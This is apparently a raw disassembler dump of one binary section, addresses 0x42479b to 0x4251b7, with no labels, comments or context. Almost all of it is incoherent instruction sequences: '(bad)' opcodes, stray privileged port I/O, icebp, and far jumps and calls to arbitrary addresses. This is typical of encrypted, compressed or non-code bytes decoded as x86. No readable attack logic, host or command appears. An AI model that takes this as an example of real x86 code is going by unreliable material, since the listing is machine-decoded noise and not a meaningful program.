  42479b:	inc    eax
  42479c:	sti    
  42479d:	mov    ebp,0x92d27023
  4247a2:	cs push ecx
  4247a4:	push   esp
  4247a5:	push   cs
  4247a6:	stos   DWORD PTR es:[edi],eax
  4247a7:	mov    ebp,0x30c6ccc3
  4247ac:	jg     0x424756
  4247ae:	pop    eax
  4247af:	daa    
  4247b0:	xchg   esp,eax
  4247b1:	in     al,dx
  4247b2:	mov    eax,0x4ce1
	...
  424813:	add    BYTE PTR [eax],al
  424815:	add    BYTE PTR [edx],ah
  424817:	pop    eax
  424818:	test   bh,ch
  42481a:	(bad)  
  42481b:	jmp    FWORD PTR [ebx-0x23]
  42481e:	rol    DWORD PTR [eax-0x5bf707de],0xf4
  424825:	or     al,ah
  424827:	test   BYTE PTR [ecx],al
  424829:	add    BYTE PTR [edi],al
  42482b:	add    DWORD PTR [eax],eax
  42482d:	add    BYTE PTR [edx],dh
  42482f:	push   esp
  424830:	add    al,0xa2
  424832:	mov    ebp,0x85287e2
  424837:	lock aas 
  424839:	mov    edx,0x2f008173
  42483e:	inc    eax
  42483f:	fisttp DWORD PTR [ebp-0xa]
  424842:	adc    DWORD PTR [eax+0x270ec42f],eax
  424848:	sbb    BYTE PTR [ebx-0x65],0x6e
  42484c:	enter  0x576,0x3a
  424850:	dec    ebx
  424851:	push   0xffffff9e
  424853:	mov    WORD PTR [edx],cs
  424855:	or     al,0x73
  424857:	or     DWORD PTR [ecx-0x5ff8da26],ebx
  42485d:	test   DWORD PTR [edi-0x5e],ebx
  424860:	cmp    al,0xba
  424862:	xchg   ebp,eax
  424863:	in     al,0xb1
  424865:	ja     0x42487e
  424867:	in     al,0x5b
  424869:	inc    eax
  42486a:	mov    cl,0x83
  42486c:	mov    dh,0xc7
  42486e:	pop    esi
  42486f:	pop    ds
  424870:	int    0x98
  424872:	cli    
  424873:	adc    al,0x8c
  424875:	loope  0x4248de
  424877:	sbb    bl,BYTE PTR [eax+esi*2-0x7fb96152]
  42487e:	lods   eax,DWORD PTR ds:[esi]
  42487f:	imul   BYTE PTR [ecx-0x3f]
  424882:	adc    eax,0xa58572e2
  424887:	add    ebp,DWORD PTR [edx+0x294c163c]
  42488d:	push   0x739d8fbe
  424892:	xor    al,al
  424894:	scas   al,BYTE PTR es:[edi]
  424895:	sti    
  424896:	or     DWORD PTR [ebp-0x51],ecx
  424899:	inc    edx
  42489a:	pusha  
  42489b:	add    BYTE PTR [ecx],bh
  42489d:	pop    edi
  42489e:	or     DWORD PTR [ecx],ecx
  4248a0:	sahf   
  4248a1:	inc    edi
  4248a2:	jb     0x424852
  4248a4:	fwait
  4248a5:	dec    DWORD PTR [eax+0x23]
  4248a8:	in     al,0x35
  4248aa:	pop    eax
  4248ab:	jmp    0x35e6ea7
  4248b0:	ja     0x4248b5
  4248b2:	sbb    al,0xd0
  4248b4:	adc    BYTE PTR [ebp+0x784231cb],0xd2
  4248bb:	aam    0x7f
  4248bd:	inc    esi
  4248be:	fld    QWORD PTR [edi+0x77]
  4248c1:	push   edx
  4248c2:	fsubr  DWORD PTR [ebp+ebp*2+0x1c]
  4248c6:	icebp  
  4248c7:	repnz xlat BYTE PTR ds:[ebx]
  4248c9:	aam    0x92
  4248cb:	je     0x42491b
  4248cd:	push   esi
  4248ce:	or     eax,0xecce6921
  4248d3:	and    esi,edi
  4248d5:	addr16 aaa 
  4248d7:	inc    ecx
  4248d8:	pushf  
  4248d9:	aas    
  4248da:	data16 cmp cl,BYTE PTR gs:[ecx]
  4248de:	pop    esi
  4248df:	fucomi st,st(5)
  4248e1:	pop    edi
  4248e2:	cmp    ch,dh
  4248e4:	inc    eax
  4248e5:	dec    esp
  4248e6:	aaa    
  4248e7:	mov    eax,0x2878b0a0
  4248ec:	sti    
  4248ed:	test   DWORD PTR [ecx+0x3a],ebp
  4248f0:	ins    BYTE PTR es:[edi],dx
  4248f1:	cld    
  4248f2:	out    dx,eax
  4248f3:	cld    
  4248f4:	test   eax,0xa67bcef4
  4248f9:	mov    ds,WORD PTR [edx]
  4248fb:	fild   WORD PTR [esi-0x6c2e4d33]
  424901:	pushf  
  424902:	push   ss
  424903:	sbb    DWORD PTR [ebp+eax*8-0x35],esi
  424907:	loop   0x4248f5
  424909:	aam    0xee
  42490b:	push   0x98fdc269
  424910:	icebp  
  424911:	out    0x5d,al
  424913:	and    eax,0xf9324caf
  424918:	scas   al,BYTE PTR es:[edi]
  424919:	cmp    DWORD PTR [ebp-0x24],0xa33b259a
  424920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424921:	fs push 0xffffff9a
  424924:	out    dx,eax
  424925:	push   edi
  424926:	jno    0x424993
  424928:	mov    ebp,0xaee1fbed
  42492d:	shl    DWORD PTR [esi+0x3d257dd3],cl
  424933:	lahf   
  424934:	lahf   
	...
  424995:	add    BYTE PTR [ebx+0x18],ch
  424998:	arpl   WORD PTR [edx+0x73],bp
  42499b:	jnp    0x424a08
  42499d:	sbb    ebp,eax
  42499f:	adc    eax,0x8bc4bac2
  4249a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249a5:	lock retf 
  4249a7:	test   DWORD PTR [ecx],eax
  4249a9:	add    BYTE PTR [edi],al
  4249ab:	add    DWORD PTR [eax],eax
  4249ad:	add    bl,dl
  4249af:	hlt    
  4249b0:	(bad)  
  4249b1:	mov    ecx,DWORD PTR [esi+ebx*8+0x58ff94b1]
  4249b8:	dec    edi
  4249b9:	and    al,0x10
  4249bb:	pop    esi
  4249bc:	jmp    0x4249b1
  4249be:	sbb    ecx,DWORD PTR [ebx]
  4249c0:	in     al,dx
  4249c1:	in     eax,dx
  4249c2:	fsubrp st(1),st
  4249c4:	jge    0x424973
  4249c6:	(bad)  
  4249c7:	sub    DWORD PTR [edx+0x55a8f8df],ebx
  4249cd:	cmp    al,0x21
  4249cf:	add    al,0x3c
  4249d1:	mov    al,ds:0xd32d55e
  4249d6:	sub    ebx,DWORD PTR [edx+ecx*4-0x59]
  4249da:	mov    ?,edx
  4249dc:	popa   
  4249dd:	test   DWORD PTR [eax],ecx
  4249df:	sbb    DWORD PTR [eax],ecx
  4249e1:	dec    ecx
  4249e2:	and    edi,ebp
  4249e4:	push   ebp
  4249e5:	ret    0xc1d7
  4249e8:	mov    esi,0xa6fb4f57
  4249ed:	es mov bl,0xd2
  4249f0:	mov    edi,0xe9528b2e
  4249f5:	jae    0x4249ad
  4249f7:	dec    esp
  4249f8:	cmp    bh,BYTE PTR [edx-0x19]
  4249fb:	add    ch,dl
  4249fd:	sub    DWORD PTR [edx-0x1e94e4ba],esp
  424a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a04:	xor    dh,BYTE PTR [edx+0x59]
  424a07:	jns    0x4249ae
  424a09:	js     0x4249ae
  424a0b:	iret   
  424a0c:	loopne 0x424a59
  424a0e:	retf   
  424a0f:	push   edi
  424a10:	inc    ebx
  424a11:	pushf  
  424a12:	out    0x4d,eax
  424a14:	sub    bh,BYTE PTR [esi-0xa6ed3e]
  424a1a:	xchg   ecx,eax
  424a1b:	cmp    eax,0x60cf7beb
  424a20:	and    esi,DWORD PTR [ecx-0x2b27214e]
  424a26:	ds sbb esp,esp
  424a29:	sbb    ah,al
  424a2b:	push   eax
  424a2c:	push   eax
  424a2d:	xor    bh,bh
  424a2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a30:	pop    esp
  424a31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a32:	repz in al,0x40
  424a35:	push   esi
  424a36:	xor    bh,ah
  424a38:	shl    DWORD PTR [ebx-0x78b7b462],0x75
  424a3f:	aad    0x64
  424a41:	jmp    0x4249c5
  424a43:	jae    0x424a1f
  424a45:	inc    esi
  424a46:	mov    eax,0xcbf80e87
  424a4b:	or     al,BYTE PTR [ebx-0x7cdf0ecb]
  424a51:	sub    al,BYTE PTR [esi+0x66]
  424a54:	lods   eax,DWORD PTR ds:[esi]
  424a55:	sar    BYTE PTR [edx+0x334fef6],cl
  424a5b:	fdiv   QWORD PTR [ecx+edx*4-0x4a]
  424a5f:	rcl    BYTE PTR [esi-0x57],0xa3
  424a63:	inc    edi
  424a64:	dec    esp
  424a65:	dec    esp
  424a66:	fst    QWORD PTR [eax+eiz*8]
  424a69:	sub    al,0xa4
  424a6b:	icebp  
  424a6c:	addr16 dec edi
  424a6e:	cs das 
  424a70:	ret    0xaef2
  424a73:	and    eax,0x642559e5
  424a78:	dec    eax
  424a79:	ja     0x424ab4
  424a7b:	cmp    cl,BYTE PTR [edx+0x11fccfa6]
  424a81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a82:	sbb    DWORD PTR [esi],esp
  424a84:	or     BYTE PTR [ecx],al
  424a86:	mov    al,ds:0xb69f1851
  424a8b:	or     ah,BYTE PTR [ebx-0x62ddd823]
  424a91:	or     al,0x14
  424a93:	or     eax,0xe6714ef2
  424a98:	dec    eax
  424a99:	or     BYTE PTR [ebx-0x7fed8fac],bl
  424a9f:	je     0x424ac1
  424aa1:	mov    bh,0xf2
  424aa3:	loopne 0x424a87
  424aa5:	std    
  424aa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424aa7:	out    dx,al
  424aa8:	jbe    0x424a58
  424aaa:	shr    BYTE PTR [ebx-0x65],1
  424aad:	cmp    ebx,ebx
  424aaf:	pop    esp
  424ab0:	jo     0x424abe
  424ab2:	(bad)  
  424ab3:	xchg   esi,eax
  424ab4:	or     eax,0x0
	...
  424b15:	add    BYTE PTR [esi],al
  424b17:	aas    
  424b18:	or     eax,0xb6bb3db9
  424b1d:	mov    edi,0x1cbed53b
  424b22:	retf   0x292e
  424b25:	pop    esp
  424b26:	rol    BYTE PTR [esi+0x1070001],cl
  424b2c:	add    BYTE PTR [eax],al
  424b2e:	sbb    al,ch
  424b30:	mov    esp,0xd58c8aae
  424b35:	adc    al,0x45
  424b37:	cmc    
  424b38:	adc    cl,BYTE PTR [edx]
  424b3a:	jbe    0x424b70
  424b3c:	aad    0x8d
  424b3e:	pop    esi
  424b3f:	push   esi
  424b40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b41:	adc    DWORD PTR [esp+eiz*8+0x42],eax
  424b45:	aam    0xe8
  424b47:	xchg   edi,eax
  424b48:	add    al,0xe7
  424b4a:	movhps xmm1,QWORD PTR [edi+0x13]
  424b4e:	std    
  424b4f:	mov    edx,0xc098cb49
  424b54:	add    ebx,DWORD PTR [eax+0x8]
  424b57:	lea    edi,[ecx-0x43347131]
  424b5d:	je     0x424ae9
  424b5f:	push   eax
  424b60:	jp     0x424b7a
  424b62:	xchg   BYTE PTR [eax-0x38],dh
  424b65:	add    al,0x9
  424b67:	dec    edi
  424b68:	shl    dh,cl
  424b6a:	aaa    
  424b6b:	xchg   edx,eax
  424b6c:	add    DWORD PTR [edx],ebx
  424b6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b6f:	lods   al,BYTE PTR ds:[esi]
  424b70:	fmul   QWORD PTR [edx+0x292cdbcb]
  424b76:	outs   dx,DWORD PTR ds:[esi]
  424b77:	out    0x8e,eax
  424b79:	and    eax,0xc6fe6723
  424b7e:	ins    BYTE PTR es:[edi],dx
  424b7f:	mov    ch,al
  424b81:	bound  edx,QWORD PTR cs:[ebp-0xb504cc1]
  424b88:	std    
  424b89:	fstp   TBYTE PTR [edi-0x4cdb9727]
  424b8f:	jmp    0x424b57
  424b91:	out    0x15,eax
  424b93:	add    ah,bh
  424b95:	pop    ebx
  424b96:	loope  0x424bd0
  424b98:	imul   edi,DWORD PTR [edx+0x55],0xdc2aae54
  424b9f:	cmp    al,0xda
  424ba1:	sbb    dh,BYTE PTR [ebx-0x7a]
  424ba4:	imul   edx,DWORD PTR [ecx+0x4b],0x7a
  424ba8:	dec    ecx
  424ba9:	mov    ds:0x32fcc07a,eax
  424bae:	mov    ds:0x87a7705b,al
  424bb3:	mov    esi,0x1cb5dba6
  424bb8:	sbb    dh,BYTE PTR [edi-0x5938feb]
  424bbe:	rol    ch,1
  424bc0:	clc    
  424bc1:	pop    es
  424bc2:	inc    ebx
  424bc3:	pushf  
  424bc4:	sub    ecx,esi
  424bc6:	dec    ecx
  424bc7:	xor    BYTE PTR [esi+0x16],ch
  424bca:	mov    es,WORD PTR [ebp-0x7018fe4e]
  424bd0:	xor    edx,ecx
  424bd2:	inc    ebp
  424bd3:	sub    eax,0x9fa8bbf5
  424bd8:	sub    edi,esp
  424bda:	je     0x424b8c
  424bdc:	sub    dh,BYTE PTR [esi+0x23]
  424bdf:	xor    BYTE PTR [ebx-0x15],ch
  424be2:	adc    ebp,DWORD PTR [edi-0x17]
  424be5:	push   edx
  424be6:	xor    BYTE PTR [esi-0x44c163ab],dl
  424bec:	hlt    
  424bed:	sub    al,0xf2
  424bef:	jg     0x424b71
  424bf1:	pushf  
  424bf2:	aas    
  424bf3:	dec    ebp
  424bf4:	jbe    0x424c44
  424bf6:	ret    0xba5
  424bf9:	test   DWORD PTR [edi-0x34553db0],eax
  424bff:	dec    edi
  424c00:	dec    ecx
  424c01:	mov    esp,0x8f2ee70e
  424c06:	push   esi
  424c07:	xchg   ebp,eax
  424c08:	pop    ss
  424c09:	cdq    
  424c0a:	jecxz  0x424c2c
  424c0c:	add    DWORD PTR [ebx+0x32],ebx
  424c0f:	mov    eax,DWORD PTR [edi]
  424c11:	mov    edi,0x32651865
  424c16:	sub    eax,0xd47a6e4a
  424c1b:	mov    ch,0x94
  424c1d:	sub    eax,0x56e6732f
  424c22:	push   ebx
  424c23:	sti    
  424c24:	xchg   edx,eax
  424c25:	add    ebx,DWORD PTR [edx]
  424c27:	xor    BYTE PTR [eax],0x4a
  424c2a:	jne    0x424c81
  424c2c:	mov    bl,0xac
  424c2e:	mov    eax,ds:0x813cb5bb
  424c33:	xchg   esp,eax
  424c34:	pop    es
	...
  424c95:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424c99:	push   0xffffffb6
  424c9b:	outs   dx,BYTE PTR ds:[esi]
  424c9c:	(bad)  
  424c9d:	fisubr WORD PTR ds:0x89588c09
  424ca3:	ret    
  424ca4:	add    BYTE PTR [edi],ah
  424ca6:	fld    DWORD PTR [edi+0x1070001]
  424cac:	add    BYTE PTR [eax],al
  424cae:	in     al,0x11
  424cb0:	xchg   esi,esp
  424cb2:	adc    esi,DWORD PTR [eax]
  424cb4:	inc    ebp
  424cb5:	sub    al,0x5d
  424cb7:	and    al,0x4a
  424cb9:	pusha  
  424cba:	mov    db1,ebx
  424cbd:	jecxz  0x424cd0
  424cbf:	loop   0x424cf7
  424cc1:	ja     0x424d26
  424cc3:	sub    cl,BYTE PTR [edi]
  424cc5:	outs   dx,DWORD PTR ds:[esi]
  424cc6:	mov    esi,0xbca41ae5
  424ccb:	mov    eax,ds:0x790f33a0
  424cd0:	(bad)  
  424cd1:	gs sahf 
  424cd3:	mov    bl,bh
  424cd5:	iret   
  424cd6:	push   ss
  424cd7:	add    al,0x9d
  424cd9:	das    
  424cda:	xchg   ch,ch
  424cdc:	ret    0xc627
  424cdf:	scas   al,BYTE PTR es:[edi]
  424ce0:	dec    ebx
  424ce1:	shl    DWORD PTR [edx-0x59],cl
  424ce4:	sub    DWORD PTR [edi+0x1b],0xffffff9c
  424ce8:	fiadd  DWORD PTR [ebp-0x5b7c2ce5]
  424cee:	mov    dh,0x7a
  424cf0:	syscall 
  424cf2:	add    DWORD PTR [edi-0x5e362022],0xda6773b4
  424cfc:	cmp    ch,BYTE PTR ss:[ecx-0x13552fb5]
  424d03:	retf   0x4e44
  424d06:	push   ebx
  424d07:	(bad)  
  424d08:	jge    0x424d2d
  424d0a:	xchg   edx,eax
  424d0b:	fist   DWORD PTR [edi-0x6a]
  424d0e:	cmp    ebx,DWORD PTR [edx]
  424d10:	mov    bh,0x3b
  424d12:	nop
  424d13:	sbb    al,0x2
  424d15:	jae    0x424ce5
  424d17:	popa   
  424d18:	leave  
  424d19:	aam    0x8d
  424d1b:	ficomp DWORD PTR [ebx-0x6dde11d6]
  424d21:	xchg   edi,eax
  424d22:	push   cs
  424d23:	dec    esp
  424d24:	sbb    al,BYTE PTR [edi+eiz*4-0x6f]
  424d28:	push   es
  424d29:	outs   dx,DWORD PTR ds:[esi]
  424d2a:	mov    esp,0x2df93d11
  424d2f:	scas   al,BYTE PTR es:[edi]
  424d30:	mov    eax,0x8f43711a
  424d35:	and    al,0x7e
  424d37:	push   ds
  424d38:	leave  
  424d39:	push   esi
  424d3a:	fcmovnbe st,st(0)
  424d3c:	add    BYTE PTR [edi-0x5b4765f2],bh
  424d42:	outs   dx,BYTE PTR ds:[esi]
  424d43:	dec    ebx
  424d44:	add    eax,0x5d424c9b
  424d49:	xor    BYTE PTR [edi],bh
  424d4b:	mov    bl,0x5d
  424d4d:	dec    esi
  424d4e:	cmp    ebp,DWORD PTR [eax+ecx*1-0x4adbd1e2]
  424d55:	jne    0x424da6
  424d57:	push   esp
  424d58:	push   0x2fca1155
  424d5d:	mov    ebx,0x40f78060
  424d62:	mov    ah,0x32
  424d64:	adc    edx,DWORD PTR [ecx]
  424d66:	test   al,0x8f
  424d68:	repnz in eax,dx
  424d6a:	mov    ds:0xe93f1cbc,al
  424d6f:	lahf   
  424d70:	mov    al,ds:0x8e7d55a9
  424d75:	icebp  
  424d76:	jle    0x424dba
  424d78:	jbe    0x424d09
  424d7a:	xlat   BYTE PTR ds:[ebx]
  424d7b:	and    esp,ebp
  424d7d:	push   edi
  424d7e:	push   eax
  424d7f:	inc    ecx
  424d80:	idiv   BYTE PTR [esi+ecx*8-0x11]
  424d84:	xor    al,0x46
  424d86:	in     eax,0x2c
  424d88:	js     0x424d0f
  424d8a:	cmp    edi,DWORD PTR [ebx+0x60]
  424d8d:	cmp    bh,BYTE PTR ss:[edx+0x35faa9b6]
  424d94:	leave  
  424d95:	nop    esi
  424d98:	fld    DWORD PTR [edi+0xc]
  424d9b:	aas    
  424d9c:	ror    DWORD PTR [edx+0x18c5d05d],cl
  424da2:	jo     0x424d66
  424da4:	xchg   esi,eax
  424da5:	pop    ds
  424da6:	or     esi,esp
  424da8:	hlt    
  424da9:	stc    
  424daa:	gs jbe 0x424db6
  424dad:	or     eax,0xcde70f5e
  424db2:	je     0x424db3
  424db4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  424e15:	add    BYTE PTR ds:0xf361d20c,bh
  424e1b:	(bad)  
  424e1c:	mov    edi,0xb8b3635c
  424e21:	xchg   DWORD PTR [ecx-0x1f880785],eax
  424e27:	mov    BYTE PTR [ecx],al
  424e29:	add    BYTE PTR [edi],al
  424e2b:	add    DWORD PTR [eax],eax
  424e2d:	add    BYTE PTR [ecx-0x2c],dl
  424e30:	jmp    0x424e75
  424e32:	adc    DWORD PTR [ebx-0x4a],edi
  424e35:	sahf   
  424e36:	mov    ecx,0xb1ae7e9f
  424e3b:	outs   dx,DWORD PTR ds:[esi]
  424e3c:	in     eax,dx
  424e3d:	dec    esi
  424e3e:	movaps xmm6,XMMWORD PTR [edx+0x59]
  424e42:	push   ebx
  424e43:	and    edi,esp
  424e45:	push   ebx
  424e46:	aam    0x37
  424e48:	pop    ecx
  424e49:	mov    edx,DWORD PTR [edi]
  424e4b:	xor    edi,DWORD PTR [ebp+0x3c]
  424e4e:	call   0x3339:0xf77276eb
  424e55:	dec    edx
  424e56:	push   eax
  424e57:	imul   eax,ecx,0xffffffe8
  424e5a:	mov    ?,WORD PTR [ebx-0x306001c0]
  424e60:	fiadd  WORD PTR [edx]
  424e62:	or     bl,cl
  424e64:	adc    eax,0xe63936a9
  424e69:	clc    
  424e6a:	(bad)  
  424e6c:	int    0x15
  424e6e:	fwait
  424e6f:	xor    al,BYTE PTR [eax-0x39fb9d5a]
  424e75:	push   esi
  424e76:	inc    edi
  424e77:	imul   esi,DWORD PTR [eax],0xa8912e59
  424e7d:	dec    ebx
  424e7e:	rol    BYTE PTR [edi],1
  424e80:	cmp    dh,bh
  424e82:	push   edi
  424e83:	dec    ebp
  424e84:	and    eax,0x4b059c8f
  424e89:	clc    
  424e8a:	jmp    0xbb796720
  424e8f:	xor    DWORD PTR [ecx-0xb],eax
  424e92:	xor    esi,DWORD PTR [ebp-0x60581366]
  424e98:	fisttp QWORD PTR [edx+ebp*4+0x7b91e9cb]
  424e9f:	(bad)  
  424ea0:	mov    ah,dh
  424ea2:	mov    eax,0x2ef6d8b9
  424ea7:	fwait
  424ea8:	stos   DWORD PTR es:[edi],eax
  424ea9:	or     eax,0x3a6e7512
  424eae:	inc    edx
  424eaf:	pop    es
  424eb0:	pop    edx
  424eb1:	scas   eax,DWORD PTR es:[edi]
  424eb2:	mov    ebp,DWORD PTR [ecx-0x59]
  424eb5:	add    DWORD PTR [edx-0xc],edx
  424eb8:	jnp    0x424f2e
  424eba:	leave  
  424ebb:	mov    cl,0x3f
  424ebd:	push   eax
  424ebe:	mov    dl,0x94
  424ec0:	mov    bh,0x21
  424ec2:	icebp  
  424ec3:	add    BYTE PTR [edx],0x54
  424ec6:	mov    bh,0xc0
  424ec8:	cmp    edi,edx
  424eca:	mov    bp,0x5edc
  424ece:	push   cs
  424ecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ed0:	mov    al,ds:0x7c9031d9
  424ed5:	scas   eax,DWORD PTR es:[edi]
  424ed6:	or     al,dl
  424ed8:	shl    BYTE PTR [ecx+0x3543cced],cl
  424ede:	cld    
  424edf:	lds    ebp,FWORD PTR [edx+eiz*8+0x63b861fa]
  424ee6:	not    BYTE PTR [ebp-0x25]
  424ee9:	ds dec esp
  424eeb:	dec    ebp
  424eec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424eed:	test   BYTE PTR [ecx],bl
  424eef:	in     eax,dx
  424ef0:	sbb    bl,BYTE PTR [edx+esi*2-0x570500e1]
  424ef7:	pop    ebx
  424ef8:	outs   dx,DWORD PTR ds:[esi]
  424ef9:	loope  0x424ed5
  424efb:	rol    DWORD PTR [edx+0x10492d39],cl
  424f01:	xchg   edx,eax
  424f02:	std    
  424f03:	lea    edi,[eax]
  424f05:	inc    edx
  424f06:	aas    
  424f07:	xor    BYTE PTR [eax+0x4ed4ffb],0xa8
  424f0e:	js     0x424eb8
  424f10:	pop    ecx
  424f11:	(bad)  
  424f12:	jnp    0x424ea7
  424f14:	add    eax,0x1dcc9723
  424f19:	mov    al,ds:0x6663ff81
  424f1e:	xor    BYTE PTR [esi-0x79],bh
  424f21:	xchg   BYTE PTR [ebp-0x54],dh
  424f24:	sbb    BYTE PTR [eax+ebp*1],dl
  424f27:	xchg   ebp,eax
  424f28:	bound  ecx,QWORD PTR [edi]
  424f2a:	sub    al,cl
  424f2c:	rcr    DWORD PTR [ebp+ebp*2+0xf7ecb4c],0x40
  424f34:	add    BYTE PTR [bx+si],al
	...
  424f93:	add    BYTE PTR [eax],al
  424f95:	add    BYTE PTR [ebx+0x16],cl
  424f98:	int    0x41
  424f9a:	fstp   st(3)
  424f9c:	iret   
  424f9d:	push   ds
  424f9e:	xor    al,0x88
  424fa0:	ror    BYTE PTR [eax-0x27eef174],1
  424fa6:	out    0x89,eax
  424fa8:	add    DWORD PTR [eax],eax
  424faa:	pop    es
  424fab:	add    DWORD PTR [eax],eax
  424fad:	add    bl,ch
  424faf:	jg     0x424fe0
  424fb1:	les    edx,FWORD PTR [edx-0x724f240]
  424fb7:	jne    0x425015
  424fb9:	(bad)  
  424fba:	jmp    0x50953893
  424fbf:	fcmovne st,st(7)
  424fc1:	pop    ss
  424fc2:	push   ecx
  424fc3:	xchg   edi,eax
  424fc4:	pop    edx
  424fc5:	mov    eax,0x7fbe0dc5
  424fca:	sub    DWORD PTR [ecx],0xffffffcd
  424fcd:	daa    
  424fce:	test   DWORD PTR [ebp+0x6a7ac645],esi
  424fd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424fd5:	push   esi
  424fd6:	lods   al,BYTE PTR ds:[esi]
  424fd7:	sub    eax,0x2cd86d11
  424fdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424fdd:	out    dx,eax
  424fde:	daa    
  424fdf:	lods   al,BYTE PTR ds:[esi]
  424fe0:	ds in  eax,0xfb
  424fe3:	jl     0x424fc2
  424fe5:	mov    DWORD PTR [edi],esp
  424fe7:	inc    esi
  424fe8:	adc    ch,ch
  424fea:	shl    cl,0xab
  424fed:	inc    ebx
  424fee:	add    dh,BYTE PTR ds:0x4f66b986
  424ff5:	pop    esi
  424ff6:	mov    WORD PTR [esi+0x5f3b21b2],?
  424ffc:	and    eax,0xd274f542
  425001:	mov    bl,BYTE PTR [esi+eax*8+0x34]
  425005:	frstor [edx+0x34d9ea28]
  42500b:	mov    dl,0x7b
  42500d:	pop    edi
  42500e:	dec    esi
  42500f:	cmp    al,0xf5
  425011:	and    dl,bh
  425013:	aaa    
  425014:	out    dx,eax
  425015:	jo     0x42503d
  425017:	adc    eax,0xddc1512a
  42501c:	xchg   edx,eax
  42501d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42501e:	jmp    0x425015
  425020:	mov    al,ds:0x7c327d54
  425025:	mov    cs,WORD PTR [edi+0x6accf756]
  42502b:	dec    esp
  42502c:	jp     0x425060
  42502e:	push   cs
  42502f:	mov    eax,ds:0x724703c4
  425034:	mov    esi,0xe67e4485
  425039:	inc    ebx
  42503a:	in     eax,dx
  42503b:	sub    eax,0xa442572c
  425040:	test   al,0x70
  425042:	das    
  425043:	out    0x5b,al
  425045:	xchg   edi,eax
  425046:	sti    
  425047:	push   ebp
  425048:	cmp    ch,BYTE PTR [esi+0x35]
  42504b:	jno    0x424ffb
  42504d:	out    0xe4,al
  42504f:	cmp    al,0x7d
  425051:	sbb    edx,DWORD PTR [esi+0x60]
  425054:	test   BYTE PTR [edi-0x5ee8712e],bl
  42505a:	sbb    edx,0x552239f1
  425060:	cmp    edx,esi
  425062:	rcr    BYTE PTR [eax+edi*2+0x70],0xdd
  425067:	dec    DWORD PTR [ebx+0x64]
  42506a:	push   ebx
  42506b:	shr    DWORD PTR [edi-0xa],cl
  42506e:	xor    ebp,edx
  425070:	pop    es
  425071:	mov    WORD PTR [ebx-0x585267c4],fs
  425077:	pushf  
  425078:	sub    ah,BYTE PTR [eax+0x4d]
  42507b:	je     0x42507c
  42507d:	out    dx,al
  42507e:	xor    dh,BYTE PTR [ebp-0x4b7ce5af]
  425084:	pop    ds
  425085:	js     0x4250ef
  425087:	data16 sbb al,bh
  42508a:	xor    eax,0xd688da57
  42508f:	inc    eax
  425090:	xchg   edx,eax
  425091:	adc    eax,0x2960b9fb
  425096:	and    BYTE PTR [eax-0x7],ch
  425099:	(bad)  
  42509a:	add    ebp,ebp
  42509c:	cmp    BYTE PTR [edx+0x4969f8c],cl
  4250a2:	push   eax
  4250a3:	rcl    BYTE PTR [eax-0x65],1
  4250a6:	das    
  4250a7:	or     BYTE PTR [eax],cl
  4250a9:	das    
  4250aa:	(bad)  
  4250ab:	pushf  
  4250ac:	ins    BYTE PTR es:[edi],dx
  4250ad:	or     al,0x15
  4250af:	xchg   edi,eax
  4250b0:	push   es
  4250b1:	ret    0xf13
  4250b4:	pop    edx
	...
  425115:	add    dh,bl
  425117:	adc    DWORD PTR [edi-0x15020dd],ebx
  42511d:	std    
  42511e:	and    al,0x47
  425120:	xchg   edi,eax
  425121:	rcl    BYTE PTR [eax-0x62],cl
  425124:	fdivr  QWORD PTR [esi+ebp*8+0x700018a]
  42512b:	add    DWORD PTR [eax],eax
  42512d:	add    BYTE PTR [esi-0x20de6246],ch
  425133:	jmp    0xeca1ac0b
  425138:	ss ret 
  42513a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42513b:	add    esp,DWORD PTR [eax]
  42513d:	std    
  42513e:	in     al,0xca
  425140:	jo     0x425106
  425142:	(bad)  [ecx+0x356fb626]
  425148:	and    al,0xc8
  42514a:	cs ins DWORD PTR es:[edi],dx
  42514c:	lds    edi,FWORD PTR [ebx-0x39283950]
  425152:	mov    ecx,0x150cc0ea
  425157:	mov    bl,0x79
  425159:	pop    es
  42515a:	pop    edi
  42515b:	(bad)  
  42515c:	scas   eax,DWORD PTR es:[edi]
  42515d:	int    0xba
  42515f:	retf   0x10a8
  425162:	dec    eax
  425163:	xchg   esp,eax
  425164:	dec    edi
  425165:	mov    ebp,0xae44105b
  42516a:	cmp    al,0xc9
  42516c:	call   0x2c1a:0x9607f11d
  425173:	rcr    cl,cl
  425175:	adc    BYTE PTR [esi],ch
  425177:	xchg   ebp,eax
  425178:	xchg   esp,eax
  425179:	mov    ebp,0x8b53af6a
  42517e:	lea    eax,[ecx-0x166d4646]
  425184:	xchg   edi,eax
  425185:	jge    0x425139
  425187:	fdiv   st,st(2)
  425189:	pushf  
  42518a:	add    esp,DWORD PTR [edx-0x54]
  42518d:	pop    eax
  42518e:	lds    ebp,FWORD PTR [edi+ecx*8]
  425191:	fisttp QWORD PTR [esp+edx*1]
  425194:	ins    BYTE PTR es:[edi],dx
  425195:	imul   ecx,eax,0x1
  425198:	push   esp
  425199:	jg     0x425212
  42519b:	xchg   ebx,eax
  42519c:	shl    BYTE PTR [eax],cl
  42519e:	clc    
  42519f:	xchg   esi,ebp
  4251a1:	sbb    dh,BYTE PTR [edx-0x4f3a81d9]
  4251a7:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251a9:	mov    esi,DWORD PTR ds:0x72e434d7
  4251af:	clc    
  4251b0:	jmp    0x4251b0
  4251b2:	mov    ah,0xb3
  4251b4:	jne    0x42515e
  4251b6:	ins    BYTE PTR es:[edi],dx
  4251b7:	std    
